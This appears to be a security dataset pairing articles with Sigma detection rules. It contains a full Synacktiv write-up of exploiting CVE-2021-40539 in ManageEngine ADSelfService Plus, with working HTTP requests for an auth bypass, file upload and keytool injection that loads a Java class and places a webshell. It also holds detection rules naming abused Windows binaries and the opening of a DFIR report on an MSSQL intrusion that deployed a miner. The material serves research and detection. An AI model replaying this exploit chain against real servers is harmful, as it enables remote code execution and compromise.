PingCastle (GitHub)\n- StandIn (GitHub)\n- Certify (GitHub)\n- ADExplorerSnapshot.py (GitHub)\n- Adidnsdump (GitHub)\n- Certipy (GitHub)\n- BloodHound.py (GitHub)",
    "sigma_rule": {
      "title": "HackTool - SOAPHound Execution",
      "id": "e92a4287-e072-4a40-9739-370c106bb750",
      "status": "test",
      "description": "Detects the execution of SOAPHound, a .NET tool for collecting Active Directory data, using specific command-line arguments that may indicate an attempt to extract sensitive AD information.\n",
      "references": [
        "https://github.com/FalconForceTeam/SOAPHound",
        "https://medium.com/falconforce/soaphound-tool-to-collect-active-directory-data-via-adws-165aca78288c"
      ],
      "author": "@kostastsale",
      "date": "2024-01-26",
      "tags": [
        "attack.discovery",
        "attack.t1087"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_1": {
          "CommandLine|contains": [
            " --buildcache ",
            " --bhdump ",
            " --certdump ",
            " --dnsdump "
          ]
        },
        "selection_2": {
          "CommandLine|contains": [
            " -c ",
            " --cachefilename ",
            " -o ",
            " --outputdirectory"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_soaphound_execution.yml",
    "id": "237"
  },
  {
    "url": "https://www.synacktiv.com/en/publications/how-to-exploit-cve-2021-40539-on-manageengine-adselfservice-plus.html",
    "markdown": "# How to exploit CVE-2021-40539 on ManageEngine ADSelfService Plus\n\n04/11/2021\nCategories: Exploit, Pentest\n\n## Introduction\n\nDuring a penetration test we encountered the ManageEngine ADSelfService Plus (ADSS) solution. ADSS offers multiple functionalities such as managing password policies for administrators or self password reset/account unlock for Active Directory users. We decided to dig into this solution. However, our research barely started that a wild exploitation on this solution was announced.\nIn this article we will explore the details of several vulnerabilities that allow an unauthenticated attacker to execute arbitrary code on the server.\n\n## First steps\n\nADSelfService Plus from ManageEngine was reported as exploited in the wild on the 8th of September 1. The solution's editor quickly deployed a security fix and released an article that has then been updated several times 2. At the beginning, ManageEngine team was only mentioning an exploit related to the REST API. To figure out what was really happening, we deployed a vulnerable version and a patched version of the solution on a lab and we started digging into this issue.\n\nADSelfService Plus is a massive Java application. However, a quick hash comparison between both versions of the numerous included jars allows identifying the parts of the source code that changed with the update. We can therefore decompile the interesting archives and diff the resulting files. We used *Meld* 3 for this last task as it conveniently compares files, folders and subfolders and highlights the differences.\n\n```image\nAlt: Meld comparison\nDescription: The image depicts a side-by-side comparison of two code segments using the Meld tool, highlighting changes made in the source code of the ManageEngine ADSelfService Plus application. The left side shows the original code, while the right side displays the modified code after the security fix. Key differences are marked, indicating an alteration in how the request URI is handled, with the original code using 'request.getRequestURI()' and the updated code replacing it with 'SecurityUtil.getNormalizedURI(request.getRequestURI())'. This visual representation aids in understanding the specific modifications relevant to addressing the CVE-2021-40539 vulnerability.\nTranscription: |\n  public static boolean isRestAPIRequest(HttpServletRequest request, JSONObject filterParams) {\n      String restApiUrlPattern = \"/RestAPI/.*\";\n  \n      try {\n          restApiUrlPattern = filterParams.optString(\"API_URL_PATTERN\", restApiUrlPattern);\n      } catch (Exception ex) {\n          out.log(Level.INFO, \"Unable to get API_URL_PATTERN.\", ex);\n      }\n      String reqURI = request.getRequestURI();\n      String contextPath = (request.getContextPath() != null) ? request.getContextPath() : \"\";\n      reqURI = reqURI.replace(contextPath, \"\");\n      reqURI = reqURI.replace(\"//\", \"/\");\n      return Pattern.matches(restApiUrlPattern, reqURI);\n  }\n  \n  public static Properties getParameters(HttpServletRequest request) {\n      Properties properties = new Properties();\n      Enumeration<String> paramNames = request.getParameterNames();\n      while (paramNames.hasMoreElements()) {\n          // ...\n      }\n  }\n```\n\n## Authentication Bypass\n\nWe know from the editor's original communication that we can gain unauthorized access through the REST API. The previous diff showed that the `com.manageengine.ads.fw.api.RestAPIUtil` class, from the `ManageEngineADSFrameworkJava` jar, had changed with the patch. It seems like a good starting point for a patch analysis.\n\nIt appears that, after the patch, a call to `request.getRequestURI();` was replaced by `SecurityUtil.getNormalizedURI(request.getRequestURI());` (as seen in the *Meld* comparison above).\n\nThe code of the `getNormalizedURI` function is the following:\n\n```image\nAlt: Update into RestAPIUtil class.\nDescription: The image displays a snippet of Java code for the method `getNormalizedURI`. This method appears to handle URI normalization, which is crucial for preventing path traversal attacks by ensuring that input paths do not lead to unauthorized access. The code includes various checks and modifications to the input path, processing it to remove any potentially harmful patterns (like `../`), thus enhancing security against authentication bypass vulnerabilities.\nTranscription: |\n  java\n  public static String getNormalizedURI(String path) {\n      if (path == null)\n          return null;\n      String normalized = path;\n      if (normalized.indexOf('\\\\') >= 0)\n          normalized = normalized.replace('\\\\', '/');\n      if (!normalized.startsWith(\"/\"))\n          normalized = \"/\" + normalized;\n      boolean addedTrailingSlash = false;\n      if (normalized.endsWith(\"/.\") || normalized.endsWith(\"/..\")) {\n          normalized = normalized + \"/\";\n          addedTrailingSlash = true;\n      }\n      while (true) {\n          int index = normalized.indexOf(\"/.\");\n          if (index < 0)\n              break;\n          normalized = normalized.substring(0, index) + normalized.substring(index + 2);\n      }\n      while (true) {\n          int index = normalized.indexOf(\"/..\");\n          if (index < 0)\n              break;\n          int index2 = normalized.lastIndexOf('/', index - 1);\n          if (index2 < 0)\n              return null;\n          normalized = normalized.substring(0, index2) + normalized.substring(index + 3);\n      }\n      if (normalized.length() > 1 && addedTrailingSlash)\n          normalized = normalized.substring(0, normalized.length() - 1);\n      return normalized;\n  }\n```\n\nThis is clearly a patch that fixes a path traversal vulnerability, which can have a serious impact. A similar example was a patch applied on Apache *httpd* at the same time 5. In our current case, the patch is addressed for an authentication bypass.\n\nA nuclei template 6, published about a week after the first advisory, details how to test if your version is vulnerable. The test payload is:\n\n```\nPOST /./RestAPI/LogonCustomization HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 27\n\nmethodToCall=previewMobLogo\n```\n\nSending the `/./` payload to both our patched and vulnerable instances points differences in the servers' responses.\n\n```image\nAlt: Request on a vulnerable server.\nDescription: The image displays a technical analysis of a request and response cycle related to a vulnerability in ManageEngine ADSelfService Plus. It includes an HTTP POST request to the REST API with specific headers and parameters, alongside the corresponding HTTP response. The request attempts to access a specific method ('previewMobLogo'), and the response indicates a successful 200 status code, suggesting the request was processed correctly. The response body contains a JavaScript snippet that manipulates elements based on the returned data.\nTranscription: |\n  Request\n  POST ./RestAPI/LogonCustomization HTTP/1.1\n  Host: 192.168.1.106:9251\n  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\n  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\n  Accept-Language: en-US,en;q=0.5\n  Accept-Encoding: gzip, deflate\n  Connection: close\n  Content-Type: application/x-www-form-urlencoded\n  Upgrade-Insecure-Requests: 1\n  Content-Length: 27\n  \n  methodToCall=previewMobLogo\n  \n  Response\n  HTTP/1.1 200\n  Set-Cookie: JSESSIONIDADSSP=13AEACAD27CF0B3A2E1CS1553D85C341; Path=/; Secure; HttpOnly\n  Content-Type: text/html;charset=UTF-8\n  Date: Thu, 21 Oct 2021 21:01:48 GMT\n  Connection: close\n  Content-Length: 221\n  \n  <script type=\"text/javascript\">\n      var d = new Date();\n      window.parent.$(\"#mobLogo\").attr(\"src\",\"/temp/tempMobPreview.jpeg?\"+d.getTime());\n      window.parent.$(\"#tabLogo\").attr(\"src\",\"/temp/tempMobPreview.jpeg?\"+d.getTime());\n  </script>\n```\n\n*Request on a vulnerable server.*\n\n```image\nAlt: Request on an up to date server.\nDescription: The image displays a technical analysis of an HTTP request and response regarding a vulnerability in ManageEngine ADSelfService Plus. It shows a POST request made to the endpoint '/RestAPI/LogonCustomization', including various HTTP headers, and the accompanying response from the server indicating a 200 status code and a set-cookie header. This analysis highlights the communication between the client and server while testing for authentication bypass vulnerabilities, specifically in the context of the CVE-2021-40539 exploit.\nTranscription: |\n  Request\n  POST ./RestAPI/LogonCustomization HTTP/1.1\n  Host: 192.168.1.105:9251\n  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\n  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\n  Accept-Language: en-US,en;q=0.5\n  Accept-Encoding: gzip, deflate\n  Connection: close\n  Content-Type: application/x-www-form-urlencoded\n  Upgrade-Insecure-Requests: 1\n  Content-Length: 27\n  \n  methodToCall=previewMobLogo\n  \n  Response\n  HTTP/1.1 200\n  Set-Cookie: JSESSIONIDADSSP=D6D56394E00C16F2526CC73A86CF9151; Path=/; Secure; HttpOnly\n  Content-Length: 0\n  Date: Tue, 02 Nov 2021 20:50:06 GMT\n  Connection: close\n```\n\n*Request on an up to date server.*\n\nAt this step, the response body indicates that the path traversal request actually bypasses the authentication process. Let's see what we can do while authenticated on the REST API.\n\n## Arbitrary file upload through the API\n\nThe `LogonCustomization` class, located in the `AdventNetADSMClient` jar, implements the `previewMobLogo` method as used in the Nuclei template's PoC.\n\n```\npublic ActionForward previewMobLogo(ActionMapping mapping, ActionForm form, HttpServletRequest request, HttpServletResponse response) {\n```\n\nOther methods of this class including one named `unspecified` looks promising. Indeed, taking a quick look at it reveals interesting calls to file uploads related functions. Interestingly enough, ManageEngine's publication 2 includes IOCs that states: \"*check for Java traceback errors that include references to NullPointerException in addSmartCardConfig or getSmartCardConfig*\". Also, the `unspecified` method's code looks for parameters related to smartcards.\n\n```\npublic ActionForward unspecified(ActionMapping mapping, ActionForm form, HttpServletRequest request, HttpServletResponse response) throws Exception {\n    [...]\n    try {\n        [...]\n       } else if (\"smartcard\".equalsIgnoreCase(request.getParameter(\"form\"))) {  // we are looking for smarcard related actions\n          String operation = request.getParameter(\"operation\");\n          SmartCardAction smartCardAction = new SmartCardAction();\n          if (operation.equalsIgnoreCase(\"Add\")) {       // and how to add one\n            request.setAttribute(\"CERTIFICATE_FILE\", ClientUtil.getFileFromRequest(request, \"CERTIFICATE_PATH\"));\n            request.setAttribute(\"CERTIFICATE_NAME\", ClientUtil.getUploadedFileName(request, \"CERTIFICATE_PATH\"));\n            smartCardAction.addSmartCardConfig(mapping, (ActionForm)dynForm, request, response);\n```\n\nAn analysis of the previous method makes it possible to determine the parameters necessary for a file upload on the server. This request illustrates the upload of an arbitrary file in the `ManageEngine\\ADSelfService Plus\\bin` folder.\n\n```\nPOST /./RestAPI/LogonCustomization HTTP/1.1\nHost: 192.168.1.106:9251\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\nAccept: Content-Type: application/x-www-form-urlencoded\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nUpgrade-Insecure-Requests: 1\nContent-Type: multipart/form-data; boundary=---------------------------39411536912265220004317003537\nTe: trailers\nConnection: close\nContent-Length: 1212\n\n-----------------------------39411536912265220004317003537\nContent-Disposition: form-data; name=\"methodToCall\"\n\nunspecified\n-----------------------------39411536912265220004317003537\nContent-Disposition: form-data; name=\"Save\"\n\nyes\n-----------------------------39411536912265220004317003537\nContent-Disposition: form-data; name=\"form\"\n\nsmartcard\n-----------------------------39411536912265220004317003537\nContent-Disposition: form-data; name=\"operation\"\n\nAdd\n-----------------------------39411536912265220004317003537\nContent-Disposition: form-data; name=\"CERTIFICATE_PATH\"; filename=\"test.txt\"\nContent-Type: application/octet-stream\n\narbitrary content\n-----------------------------39411536912265220004317003537--\n```\n\nA successful upload results in the server replying with a 404 response code.\n\n```\nHTTP/1.1 404 Not Found\nContent-Type: text/html;charset=UTF-8\nConnection: close\nContent-Length: 135536\n[...]\n```\n\nWe can nevertheless confirm the presence of the file in the directory.\n\n```image\nAlt: Arbitrary file upload\nDescription: The image displays a file directory structure for ManageEngine's ADSelfService Plus application, specifically focusing on the 'bin' folder. It shows several batch files and a text document named 'test.txt' which was created on October 25, 2021. The content of 'test.txt' includes the phrase 'arbitrary content,' indicating that a file has been successfully uploaded to this location. The text file's properties, such as modification date and file size, are also visible, providing context about the file upload process discussed in the accompanying text.\nTranscription: |\n  This PC > Local Disk (C:) > ManageEngine > ADSelfService Plus > bin\n  \n  Name                    Date modified       Type                       Size\n  setCommonEnv.bat        5/25/2021 6:34 AM   Windows Batch File         1 KB\n  setMaxMemory.bat        5/25/2021 6:34 AM   Windows Batch File         1 KB\n  SetPermission.bat       5/25/2021 6:34 AM   Windows Batch File         1 KB\n  setupNpsExtension.ps1   5/25/2021 6:34 AM   Windows PowerShell Script  23 KB\n  SFintegration.bat       5/25/2021 6:34 AM   Windows Batch File         1 KB\n  shutdown.bat            5/25/2021 6:34 AM   Windows Batch File         1 KB\n  startDB.bat             5/25/2021 6:34 AM   Windows Batch File         1 KB\n  startTrayIcon.bat       5/25/2021 6:34 AM   Windows Batch File         1 KB\n  status.vbs              5/25/2021 6:34 AM   VBScript Script File       1 KB\n  stopDB.bat              5/25/2021 6:34 AM   Windows Batch File         1 KB\n  test.txt                10/25/2021 4:45 PM  Text Document              1 KB\n  UMLInvoker.bat          5/25/2021 6:34 AM   Windows Batch File         1 KB\n  UniqueID.exe            5/25/2021 6:34 AM   Application                89 KB\n  \n  test.txt - Notepad\n  arbitrary content\n```\n\nBy performing this request, we confirm some of ManageEngine's IOCs 2: the 404 response and the presence of the errors in the logs. However, the logs from the *NullPointerException* are not the same as the one reported by ManageEngine.\n\n```\n[00:05:39:578]|[10-22-2021]|[SYSERR]|[INFO]|[79]: java.lang.ClassCastException: org.apache.catalina.connector.RequestFacade cannot be cast to com.adventnet.iam.security.SecurityRequestWrapper|\n[00:05:39:578]|[10-22-2021]|[SYSERR]|[INFO]|[79]: \tat com.adventnet.sym.adsm.common.webclient.util.ClientUtil.getFileFromRequest(ClientUtil.java:768)|\n[...]\n[00:05:39:685]|[10-22-2021]|[SYSERR]|[INFO]|[79]: java.lang.NullPointerException|\n[00:05:39:685]|[10-22-2021]|[SYSERR]|[INFO]|[79]: \tat com.adventnet.sym.adsm.common.server.util.UserUtil.getUserPersonal(UserUtil.java:1039)|\n[00:05:39:685]|[10-22-2021]|[SYSERR]|[INFO]|[79]: \tat com.adventnet.sym.adsm.common.server.util.UserUtil.getUserPersonal(UserUtil.java:1000)|\n```\n\nAt this point, it is possible to upload any kind of file with arbitrary content into the `ManageEngine\\ADSelfService Plus\\bin` directory.\n\n## Arguments injection\n\nWhile updates of the ManageEngine documentation give more details about this issue 7, the exploitation of the `/RestAPI/Connection` endpoint is still missing at this stage.\n\nThe `com.adventnet.sym.adsm.common.webclient.admin.ConnectionAction` class seems to be related to this API endpoint. A quick look into it showed up the following method:\n\n```\npublic ActionForward openSSLTool(ActionMapping actionMap, ActionForm actionForm, HttpServletRequest request, HttpServletResponse response) throws Exception {\n    String action = request.getParameter(\"action\");\n    if (action != null && action.equals(\"generateCSR\"))\n      SSLUtil.createCSR(request);\n    return actionMap.findForward(\"SSLTool\");\n  }\n```\n\nThe `openSSLTool` method takes an `action` HTTP parameter and will call `SSLUtil.createCSR` if it equals `generateCSR`. By digging into the source code of this method, we can observe two unsanitized parameters, `keysize` and `validity`, that are used to build the parameter of a `runCommand` call:\n\n```\npublic static JSONObject createCSR(JSONObject sslSettings) throws Exception {\n    [...]\n    StringBuilder keyCmd = new StringBuilder(\"..\\\\jre\\\\bin\\\\keytool.exe  -J-Duser.language=en -genkey -alias tomcat -sigalg SHA256withRSA -keyalg RSA -keypass \");     // the command is prepared\n    keyCmd.append(password);\n    keyCmd.append(\" -storePass \").append(password);\n    String keyLength = sslSettings.optString(\"KEY_LENGTH\", null);\n    if (keyLength != null && !keyLength.equals(\"\"))\n       keyCmd.append(\" -keysize \").append(keyLength);     // first parameter\n    String validity = sslSettings.optString(\"VALIDITY\", null);\n    if (validity != null && !validity.equals(\"\"))\n       keyCmd.append(\" -validity \").append(validity);    // second parameter\n    [...]\n    JSONObject jStatus = new JSONObject();            \n    String status = runCommand(keyCmd.toString());      // command is executed here\n    [...]\n```\n\nBy following that call we end into the `runRuntimeExec` method (in the `AdventNetADSMServer` jar):\n\n```\npublic void runRuntimeExec() {\n    if (this.command == null) {\n      if (this.proc == null)\n        return;\n      getStdErr();\n    } else {\n      Process p = null;\n      String line = null;\n      try {\n        p = Runtime.getRuntime().exec(this.command);\n      } catch (Exception e) {\n        systemerr(\"The command could not be executed\");\n        this.result = false;\n      }\n      boolean isPingCmd = (this.command.indexOf(\"RemCom\") != -1);\n      this.result = runCommandStatus(p, isPingCmd);\n    }\n  }\n```\n\nOverall, it appears we can inject into a command line that launches the `keytool` exe. However, the use of `Runtime.getRuntime().exec()` prevents escaping from the expected target binary. Fortunately for us, we are still able to inject arbitrary parameters. One feature of `keytool` is to be able to load a Java class 8. If we can build our own Java class, upload it with an API call to `LogonCustomization`, we could then use it with `keytool` in order to get it executed.\n\nA bit of dynamic analysis with Procmon and a query to the `/RestAPI/Connection` endpoint can confirm the execution of the `keytool` binary.\n\n```\nPOST /./RestAPI/Connection HTTP/1.1\nHost: 192.168.1.105:9251\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\nAccept: Content-Type: application/x-www-form-urlencoded\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nUpgrade-Insecure-Requests: 1\nContent-Type: application/x-www-form-urlencoded\nTe: trailers\nConnection: close\nContent-Length: 43\n\nmethodToCall=openSSLTool&action=generateCSR\n```\n\n```image\nAlt: Monitoring with procmon.\nDescription: The image is a screenshot from Sysinternals Process Monitor, displaying the execution log of processes on a Windows system. The log specifically highlights the execution of 'keytool.exe', showing the command line used to run it, which includes parameters such as '-J-Duser.language=en' and other related execution details. The list of operations includes registry interactions and process starts related to the ManageEngine ADSelfService Plus application, illustrating the internal workings of the system during a specific command execution.\nTranscription: |\n  12:47:...    java.exe       Process Start      ...\\java.exe -Duser.language=en\n  12:47:...    keytool.exe    Process Start      ...\\keytool.exe -J-Duser.language=en\n  12:47:...    keytool.exe    Thread Create      ...\\keytool.exe -J-Duser.language=en\n  12:47:...    keytool.exe    Load Image         C:\\Windows\\System32\\win32.dll\n  12:47:...    keytool.exe    RegOpenKey         HKLM\\System\\CurrentControlSet\\Control\\Session Manager\n  12:47:...    java.exe       Thread Create      ...\\java.exe -Duser.language=en\n```\n\nThe executed command is the following:\n\n```\n..\\jre\\bin\\keytool.exe -J-Duser.language=en -genkey -alias tomcat -sigalg SHA256withRSA -keyalg RSA -keypass \"null\" -storePass \"null\" -dName \"CN=null, OU= null, O=null, L=null, S=null, C=null\" -keystore ..\\jre\\bin\\SelfService.keystore\n```\n\n## Chaining everything together to get code execution\n\nWe saw we can bypass the authentication process by adding the `/./` snippet to the REST API route and perform an arbitrary file upload. We also saw that an arbitrary Java class can be loaded through an injection in the keytool binary parameters. Combining both issues, we should be able to get an arbitrary code execution.\n\nThe following Java code, which executes `calc.exe`, will be used as a proof of concept.\n\n```\nimport java.io.*;\npublic class Si{\n    static{\n        try{\n            Runtime rt = Runtime.getRuntime();\n            Process proc = rt.exec(\"calc\");\n        }catch (IOException e){}\n    }\n}\n```\n\nAn important note for a successful exploitation is that we need to compile our code with the same Java major version 8 as the solution.\n\n```\nC:\\ManageEngine\\ADSelfService Plus\\jre\\bin> java -version\njava version \"1.8.0_162\"\nJava(TM) SE Runtime Environment (build 1.8.0_162-b12)\nJava HotSpot(TM) 64-Bit Server VM (build 25.162-b12, mixed mode)\n\nC:\\> javac Si.java\n```\n\nOnce properly compiled, our PoC class can be uploaded to the server using the `LogonCustomization` endpoint, as previously:\n\n```\nPOST /./RestAPI/LogonCustomization HTTP/1.1\nHost: 192.168.1.105:9251\nContent-Length: 989\nContent-Type: multipart/form-data; boundary=fcc62d4b058687f46994b5245a8c8e9f\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\n\n--fcc62d4b058687f46994b5245a8c8e9f\nContent-Disposition: form-data; name=\"methodToCall\"\n\nunspecified\n--fcc62d4b058687f46994b5245a8c8e9f\nContent-Disposition: form-data; name=\"Save\"\n\nyes\n--fcc62d4b058687f46994b5245a8c8e9f\nContent-Disposition: form-data; name=\"form\"\n\nsmartcard\n--fcc62d4b058687f46994b5245a8c8e9f\nContent-Disposition: form-data; name=\"operation\"\n\nAdd\n--fcc62d4b058687f46994b5245a8c8e9f\nContent-Disposition: form-data; name=\"CERTIFICATE_PATH\"; filename=\"ws.jsp\"\n\n7\n\nStackMapTableLineNumberTabl<clinit>\nSourceFileSi.java\n\n                        calc\n                            ava/io/IOExceptionSijava/lang/Objectjava/lang/Runtime\ngetRuntime()Ljava/lang/Runtime;exec'(Ljava/lang/String;)Ljava/lang/Process;!\n*\nIK*LK\n\nN\n--fcc62d4b058687f46994b5245a8c8e9f--\n```\n\nAll that's left is to force the loading of our newly uploaded class through the `keytool.exe` argument injection.\n\n```\nPOST /./RestAPI/Connection HTTP/1.1\nHost: 192.168.1.105:9251\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\nAccept: Content-Type: application/x-www-form-urlencoded\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nUpgrade-Insecure-Requests: 1\nContent-Type: application/x-www-form-urlencoded\nTe: trailers\nConnection: close\nContent-Length: 132\n\nmethodToCall=openSSLTool&action=generateCSR&KEY_LENGTH=1024+-providerclass+Si+-providerpath+\"C:\\ManageEngine\\ADSelfService+Plus\\bin\"\n```\n\n\n\nFor a little more comfort, it is also possible to exploit the file upload to write a JSP webshell on the filesystem. It can then be moved into the webroot with the Java code execution.\n\n```\nimport java.io.*;\npublic class Si{\n    static{\n        try{\n            Runtime rt = Runtime.getRuntime();\n            Process proc = rt.exec(new String[] {\"cmd\", \"/c\", \"copy\", \"helloworld.jsp\", \"..\\\\webapps\\\\adssp\\\\help\\\\admin-guide\\\\helloworld.jsp\"});\n        }catch (IOException e){}\n    }\n}\n```\n\nAfter triggering the command execution with `keytool`, our uploaded webshell is available at `http(s)://TARGET/help/admin-guide/helloworld.jsp`.\n\nAn exploitation code has been released on our GitHub.\n\n## Conclusion\n\nNone of the public analysis of this vulnerability mentions a Java class upload. The CISA report also mentions that \"Subsequent requests are then made to different API endpoints to further exploit the victim's system.\" which is not the case here. Chances are in-the-wild attackers made use of another exploitation path. Anyway, the patch applied by ManageEngine only fixes the path traversal issue. While actually preventing our exploitation, this leaves opened the file upload and parameter injection issues for future use.\n\n---\n\n### Footnotes\n\n1. https://twitter.com/TheHackersNews/status/1435842539513270274\n2. https://www.manageengine.com/products/self-service-password/kb/how-to-fix-authentication-bypass-vulnerability-in-REST-API.html\n3. https://meldmerge.org/\n5. https://httpd.apache.org/security/vulnerabilities_24.html#2.4.51\n6. https://github.com/projectdiscovery/nuclei-templates/blob/77c3dc36ac7df4c04e3ff7cd97f5f63ec8dc7311/cves/2021/CVE-2021-40539.yaml\n7. https://us-cert.cisa.gov/ncas/alerts/aa21-259a\n8. https://srcincite.io/blog/2020/01/14/busting-ciscos-beans-hardcoding-your-way-to-hell.html",
    "sigma_rule": {
      "title": "Suspicious Shells Spawn by Java Utility Keytool",
      "id": "90fb5e62-ca1f-4e22-b42e-cc521874c938",
      "status": "test",
      "description": "Detects suspicious shell spawn from Java utility keytool process (e.g. adselfservice plus exploitation)",
      "references": [
        "https://redcanary.com/blog/intelligence-insights-december-2021",
        "https://www.synacktiv.com/en/publications/how-to-exploit-cve-2021-40539-on-manageengine-adselfservice-plus.html"
      ],
      "author": "Andreas Hunkeler (@Karneades)",
      "date": "2021-12-22",
      "modified": "2023-01-21",
      "tags": [
        "attack.initial-access",
        "attack.persistence",
        "attack.privilege-escalation"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ParentImage|endswith": "\\keytool.exe",
          "Image|endswith": [
            "\\cmd.exe",
            "\\sh.exe",
            "\\bash.exe",
            "\\powershell.exe",
            "\\pwsh.exe",
            "\\schtasks.exe",
            "\\certutil.exe",
            "\\whoami.exe",
            "\\bitsadmin.exe",
            "\\wscript.exe",
            "\\cscript.exe",
            "\\scrcons.exe",
            "\\regsvr32.exe",
            "\\hh.exe",
            "\\wmic.exe",
            "\\mshta.exe",
            "\\rundll32.exe",
            "\\forfiles.exe",
            "\\scriptrunner.exe",
            "\\mftrace.exe",
            "\\AppVLP.exe",
            "\\systeminfo.exe",
            "\\reg.exe",
            "\\query.exe"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_java_keytool_susp_child_process.yml",
    "id": "245"
  },
  {
    "url": "https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/",
    "markdown": "# SELECT XMRig FROM SQLServer\n\n**Categories:** coinminer, exploit \n**Published Date:** July 11, 2022 \n\n---\n\nIn March 2022, we observed an intrusion on a public-facing Microsoft SQL Server. The end goal of this intrusion was to deploy a coin miner. Although deploying a coin miner on a vulnerable server after successful exploitation is a common objective for threat actors, this intrusion was slightly different and therefore more interesting.\n\nUS CERT recently published a malware analysis report related to XMRig coin miner on 23rd June 2022 (link) and a security tip for defending against this threat (link).\n\n---\n\n## Summary\n\nOver the month of March, we observed a cluster of activity targeting MSSQL servers. The activity started via password brute force attempts for the MSSQL SA account. These brute force attempts were observed repeatedly over the month. Examples included one cluster of 24,000 failed attempts from the same source, over a 27-hour effort, before they finally managed to guess the password. After obtaining the correct credentials, the attackers spawned a command shell via `xp_cmdshell`. According to Microsoft documentation, `xp_cmdshell` spawns a Windows command shell and passes in a string for execution.\n\nUsing `xp_cmdshell`, the threat actors were able to execute any command against the compromised server. They attempted to kill a bunch of AV programs by using `taskkill.exe`. The threat actors then wrote multiple commands to a batch file by using `echo` and redirecting the strings to a file named `1.bat`. After the batch file was written, they proceeded to perform the same action echoing data into a file named `bigfile.txt`. After finishing writing to that file, they ran `certutil` to decode the base64 data into an executable file. This executable was a privilege escalation tool used to execute the batch file to ensure it executed with high enough permissions. They then executed the batch script. The commands included adding new users to the local administrators group, enabling RDP, enabling WDigest, and hiding the newly created admin accounts using the registry.\n\nOnce the threat actors had established persistence on the compromised host, they moved to their final objective, which was to install and run the XMRig miner. They dropped a Binary Managed Object Format (BMOF) file along with the miner itself to achieve this. The threat actors used `mofcomp.exe` to decompile the BMOF binary and register a malicious class in the WMI repository. The event consumer of the newly created classes included a VBE script responsible for setting up and executing the XMRig miner with the correct settings.\n\nNo other activity beyond the mining was observed before the threat actors were evicted.\n\n---\n\n## Services\n\nWe offer multiple services, including a Threat Feed service that tracks Command and Control frameworks such as Cobalt Strike, Sliver, BumbleBee, Covenant, Metasploit, Empire, PoshC2, etc. More information on this service and others can be found here.\n\nArtifacts for this case are limited due to the environment. A few log sources are available for this case under our Security Researcher and Organization services.\n\n---\n\n## Initial Access\n\nThe initial access took place via a brute-force attack, where the threat actors mainly targeted the System Admin (SA) account.\n\nDuring the intrusions, we could see SQL Server event ID **18456** Failure Audit Events in the Windows application logs. We witnessed more than 24,000 attempts from the same source before the threat actors successfully guessed the username and password for the open SQL database.\n\n### Example of the failed brute force attempts:\n\n```image\nAlt: Failed Attempts\nDescription: The image displays a series of failed login attempts to a SQL Server, showing usernames and the corresponding reasons for failure. Each entry indicates whether the password did not match or the login could not be found. The usernames include common administrative names like 'sa' and 'admin,' highlighting potential brute force attack attempts.\nTranscription: |\n  sa | Reason: Password did not match that for the login provided. |\n  hbv7 | Reason: Could not find a login matching the name provided. |\n  su | Reason: Could not find a login matching the name provided. |\n  ps | Reason: Could not find a login matching the name provided. |\n  vice | Reason: Could not find a login matching the name provided. |\n  kisadmin | Reason: Could not find a login matching the name provided. |\n  401hk | Reason: Could not find a login matching the name provided. |\n  sysdba | Reason: Could not find a login matching the name provided. |\n  admin | Reason: Password did not match that for the login provided. |\n  uep | Reason: Could not find a login matching the name provided. |\n  bizbox | Reason: Could not find a login matching the name provided. |\n  neterp | Reason: Could not find a login matching the name provided. |\n  unierp | Reason: Could not find a login matching the name provided. |\n  sp | Reason: Could not find a login matching the name provided. |\n  root | Reason: Password did not match that for the login provided. |\n  bwsa | Reason: Could not find a login matching the name provided. |\n```\n\n### Followed by eventual successful logins:\n\n```image\nAlt: Successful Logins\nDescription: The image depicts a table displaying SQL Server audit events. It includes columns such as 'TimeWritten,' 'EventID,' 'EventTypeName,' 'EventCategory,' 'SourceName,' and 'Strings,' showing multiple entries for successful audit events. The entries indicate the timestamps of the events, the event type as 'Success Audit event,' and the source name as 'MSSQL$SQLEXPRESS,' suggesting automated access attempts by the threat actor.\nTranscription: |\n  | TimeWritten      | EventID | EventT | EventTypeName       | EventC | SourceName       | Strings       |\n  | ---------------- | ------- | ------ | ------------------- | ------ | ---------------- | ------------- |\n  | 2022-11-01 11:00 | 18454   | 8      | Success Audit event | 4      | MSSQL$SQLEXPRESS | sa | [CLIENT: |\n  | 2022-11-01 11:00 | 18454   | 8      | Success Audit event | 4      | MSSQL$SQLEXPRESS | sa | [CLIENT: |\n  | 2022-11-01 11:01 | 18454   | 8      | Success Audit event | 4      | MSSQL$SQLEXPRESS | sa | [CLIENT: |\n```\n\nIt is likely that multiple successful logins were observed due to the automated access script that the threat actor was using.\n\n---\n\n## Execution\n\nIn the next attack stage, the threat actors established a cmd shell via Extended SQL Stored Procedure (`xp_cmdshell`). This process allows you to issue operating system commands directly to the Windows command shell using T-SQL code.\n\n### Example of command execution following a successful authentication to SQL database using 